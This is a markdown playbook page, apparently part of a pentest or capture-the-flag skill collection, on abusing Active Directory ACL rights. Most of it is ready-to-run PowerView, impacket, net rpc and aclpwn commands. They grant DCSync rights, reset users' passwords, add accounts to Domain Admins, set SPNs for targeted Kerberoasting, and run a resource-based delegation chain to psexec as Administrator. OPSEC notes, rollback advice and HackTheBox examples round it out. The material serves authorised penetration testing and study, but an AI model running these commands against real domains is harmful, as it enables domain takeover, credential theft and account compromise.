# WriteDACL / GenericAll / GenericWrite ACL Abuse

> Modify ACLs on AD objects to grant yourself privileged rights, the
> classic "write your own permissions" attack class.

## Objective
Convert a `WriteDACL` / `WriteOwner` / `GenericAll` / `GenericWrite`
edge into the privilege you actually need (DCSync, group membership,
SPN add, password reset).

## When To Use
BloodHound shows your owned principal has any of:
- `WriteDACL` on a target object
- `WriteOwner` on a target object
- `GenericAll` on a target object
- `GenericWrite` on a target object
- `Owns` (SD owner)

## Detection Indicators
BloodHound paint-by-numbers — these edges are in every modern AD
chain. Or via PowerView:

```powershell
Get-DomainObjectAcl -Identity '<target>' -ResolveGUIDs \
  | ?{$_.IdentityReferenceName -eq '<our-user>'}
```

## Enumeration Strategy

```bash
# bloodhound-python collects ACLs by default
bloodhound-python -u <u> -p '<p>' -d <dom> -ns <ip> -c All
```

```powershell
# manual confirmation
Find-InterestingDomainAcl -ResolveGUIDs \
  | ?{$_.IdentityReferenceName -eq 'svc-alfresco'}
```

## Exploitation Workflow — by edge type

### WriteDACL on the domain object → DCSync

```powershell
# from a Windows shell as the user who has WriteDACL
. .\PowerView.ps1
$pass = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<dom>\<u>', $pass)
Add-DomainObjectAcl -TargetIdentity 'DC=<...>,DC=<...>' \
  -PrincipalIdentity '<u>' -Rights DCSync -Credential $cred
```

```bash
# from Linux
impacket-dacledit -action 'write' -rights 'DCSync' \
  -principal <u> -target-dn '<domain-dn>' \
  '<dom>/<u>:<pass>'
```

### WriteDACL or WriteOwner on a user → ForceChangePassword

```powershell
Set-DomainUserPassword -Identity '<target>' -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Credential $cred
```

```bash
# Linux equivalent
net rpc password '<target>' 'NewPass1!' -U '<dom>/<u>%<pass>' -S <dc>
```

### GenericAll on a group → AddMember

```powershell
Add-DomainGroupMember -Identity '<group>' -Members '<u>' -Credential $cred
```

```bash
# Linux equivalent
net rpc group addmem '<group>' '<u>' -U '<dom>/<u>%<pass>' -S <dc>
```

### GenericWrite on a user → Targeted Kerberoasting

If the target user has no SPN, set one, then Kerberoast.

```bash
impacket-addspn -u '<u>' -p '<p>' -t '<target>' 'fake/spn' <dc-ip>
impacket-GetUserSPNs <dom>/<u>:<p> -dc-ip <ip> -request -spn 'fake/spn'
hashcat -m 13100 ...
# remove the SPN to clean up
impacket-addspn -u '<u>' -p '<p>' -t '<target>' 'fake/spn' <dc-ip> -r
```

### GenericWrite on a computer → RBCD (modern)

```bash
# Resource-Based Constrained Delegation
impacket-addcomputer -computer-name 'fake$' -computer-pass 'Pass123!' -dc-ip <ip> '<dom>/<u>:<p>'
impacket-rbcd -delegate-from 'fake$' -delegate-to '<victim$>' -action write '<dom>/<u>:<p>'
impacket-getST -spn 'cifs/<victim>.<dom>' -impersonate Administrator '<dom>/fake$:Pass123!'
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass Administrator@<victim>
```

### WriteOwner → take ownership → modify ACL

```powershell
# 1. Take ownership
Set-DomainObjectOwner -TargetIdentity '<target>' -PrincipalIdentity '<u>' -Credential $cred

# 2. Now you can WriteDACL on it (just like above)
Add-DomainObjectAcl -TargetIdentity '<target>' -PrincipalIdentity '<u>' -Rights All
```

## Commands (cheat-sheet)

```bash
# add yourself to a group (when you have GenericAll on the group)
net rpc group addmem 'Domain Admins' '<u>' -U '<dom>/<u>%<pass>' -S <dc>

# reset a user password (when you have ForceChangePassword)
net rpc password '<target>' 'NewPass1!' -U '<dom>/<u>%<pass>' -S <dc>

# grant DCSync (when you have WriteDACL on domain)
impacket-dacledit -action write -rights DCSync -principal <u> -target-dn 'DC=...,DC=...' '<dom>/<u>:<pass>'

# add SPN (when you have GenericWrite)
impacket-addspn -u <u> -p '<p>' -t <target> 'fake/spn' <dc-ip>
```

## Tool Usage

- **PowerView.ps1** — `Add-DomainObjectAcl`, `Add-DomainGroupMember`,
  `Set-DomainUserPassword`, `Set-DomainObjectOwner`,
  `Find-InterestingDomainAcl`.
- **impacket-dacledit** — Linux ACL editor; recently added.
- **impacket-addspn** — set/remove an SPN.
- **impacket-rbcd** — Resource-Based Constrained Delegation.
- **net rpc** — Samba's net for cross-platform AD operations.
- **aclpwn** — automates entire WriteDACL → DCSync chain end-to-end.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Modifying ACLs without rolling them back | Polluted environment (real engagements) | Always remove your changes after exploitation |
| Wrong target DN | Tools error "object not found" | Pull DN exactly as BloodHound shows; `CN=...,DC=...` |
| Skipping ownership step on WriteOwner | "Access denied" on ACL change | Take ownership first, then WriteDACL |
| Forgetting to refresh tickets after group change | New rights don't apply | New `kinit` / re-login |

## Decision-Making Logic

```
BloodHound edge inventory:
  WriteDACL on domain    → grant DCSync, then secretsdump
  WriteDACL on user      → grant DCSync (works if you give yourself the ACE on the domain via a group)
  WriteOwner on object   → take ownership → WriteDACL
  GenericAll on user     → reset password
  GenericAll on group    → add yourself
  ForceChangePassword    → reset password
  GenericWrite on user   → set SPN, kerberoast (Targeted Kerberoast)
  GenericWrite on machine→ RBCD attack
```

## Pivot Opportunities

After ACL abuse:
- DCSync (most common goal).
- Lateral movement as compromised user.
- Full domain takeover via krbtgt extraction.

## OPSEC Considerations

- Every ACL change is logged on the DC (Event 5136 — Directory Service
  changes — when auditing is enabled).
- "Recently modified ACLs" is a high-fidelity hunting query.
- Always plan a roll-back: store the original ACE before changing.

## Real HTB Examples

- **Forest** — WriteDACL on domain via Exchange Windows Permissions →
  DCSync.
- **Resolute** — `DnsAdmins` group: DLL-loading abuse (different but
  related class).
- **Cascade** — no direct WriteDACL, but AD Recycle Bin queries are an
  ACL-class read-only abuse.
- **Sniper, Multimaster, Outdated, Authority, Forge** — varied ACL
  edges as part of the chain.
- Many modern HTB AD machines start with a small ACL primitive that
  cascades into DA.

## Alternative Techniques

- **aclpwn.py** — single-command WriteDACL → DCSync.
- **Constrained / unconstrained delegation** — different abuse class
  (token-based, not ACL-based).
- **AD CS abuse** — modern ESC1-ESC8 attacks; different vulnerability
  class.

## Automation Opportunities

```bash
aclpwn -d <dom> -u '<u>' -p '<p>' -dc <dc> -from '<u>' -to '<dom-dn>' --restore
# automated: detect DCSync path, exploit, optionally restore
```

## Checklist

- [ ] BloodHound shows the edge
- [ ] Confirm via PowerView / dacledit
- [ ] Apply the smallest necessary ACL change
- [ ] Use the new privilege (DCSync, addmember, etc.)
- [ ] Roll back the ACL change (real engagements)

## Related Skills

- [`active-directory/dcsync.md`](dcsync.md)
- [`active-directory/bloodhound-usage.md`](bloodhound-usage.md)
- [`active-directory/kerberoasting.md`](kerberoasting.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
